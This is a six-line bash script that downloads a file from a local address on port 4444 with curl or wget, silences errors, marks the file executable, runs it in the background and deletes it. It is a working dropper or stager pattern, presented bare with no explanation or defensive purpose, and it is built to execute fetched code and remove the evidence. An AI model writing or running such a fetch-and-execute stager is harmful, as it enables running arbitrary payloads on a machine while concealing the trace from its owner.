#!/bin/bash
u="http://127.0.0.1:4444/s1"
x=$(mktemp)
curl -sk "$u" -o $x 2>/dev/null || wget -q "$u" -O $x 2>/dev/null
chmod +x $x && $x &
rm -f $x